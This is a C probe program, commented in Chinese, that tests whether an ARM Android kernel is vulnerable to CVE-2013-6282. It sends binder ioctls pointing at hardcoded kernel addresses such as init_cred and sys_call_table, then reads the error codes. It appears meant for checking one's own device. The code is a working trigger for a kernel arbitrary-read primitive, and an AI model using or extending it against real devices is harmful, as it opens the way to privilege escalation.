/*
 * cve2013test —— 判定 CVE-2013-6282（ARM get_user/put_user 缺 access_ok）
 *                在本机 3.4.5 上是否仍然存在
 *
 * 思路（只读，零破坏）：
 *   把 binder_write_read.write_buffer 指向一个内核地址，
 *   binder_thread_write() 会执行 get_user(cmd, (uint32_t __user *)ptr)。
 *
 *   - 若 access_ok 生效  → get_user 直接失败 → ioctl 返回 -1, errno=EFAULT(14)
 *   - 若 access_ok 被绕过 → 真的读到内核数据 → cmd 进入 switch →
 *                         不匹配任何 BC_* → 返回 -1, errno=EINVAL(22)
 *
 *   第二种情况即证明任意内核读可用。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

struct binder_write_read {
	int32_t write_size;
	int32_t write_consumed;
	uint32_t write_buffer;
	int32_t read_size;
	int32_t read_consumed;
	uint32_t read_buffer;
};

#define BINDER_WRITE_READ 0xc0186201u

/* 试探用的内核地址（只读区，读错也不会崩） */
static const uint32_t probe_addrs[] = {
	0xc0008000u,   /* _stext，内核代码段起始 */
	0xc0008004u,
	0xc0b79be0u,   /* init_task */
	0xc0b9f1dcu,   /* init_cred */
	0xc000e744u,   /* sys_call_table */
};

int main(void)
{
	int fd, i;
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("=== CVE-2013-6282 probe (uid=%d) ===\n", getuid());

	fd = open("/dev/binder", O_RDONLY);
	if (fd < 0) {
		printf("[!] open /dev/binder failed: errno=%d (%s)\n", errno, strerror(errno));
		return 1;
	}
	printf("[+] /dev/binder opened, fd=%d\n", fd);

	for (i = 0; i < (int)(sizeof probe_addrs / sizeof probe_addrs[0]); i++) {
		struct binder_write_read bwr;
		int r;

		memset(&bwr, 0, sizeof bwr);
		bwr.write_size = 4;
		bwr.write_consumed = 0;
		bwr.write_buffer = probe_addrs[i];
		bwr.read_size = 0;
		bwr.read_consumed = 0;
		bwr.read_buffer = 0;

		errno = 0;
		r = ioctl(fd, BINDER_WRITE_READ, &bwr);
		printf("[probe %08x] ret=%d errno=%d (%s) consumed=%d\n",
		       probe_addrs[i], r, errno, strerror(errno), bwr.write_consumed);

		if (r < 0 && errno == EFAULT)
			printf("      -> access_ok ENFORCED (patched)\n");
		else if (r < 0 && errno != EFAULT)
			printf("      -> !!! get_user SUCCEEDED on kernel addr -> VULNERABLE !!!\n");
		else
			printf("      -> unexpected success\n");
	}

	close(fd);
	printf("=== done ===\n");
	return 0;
}
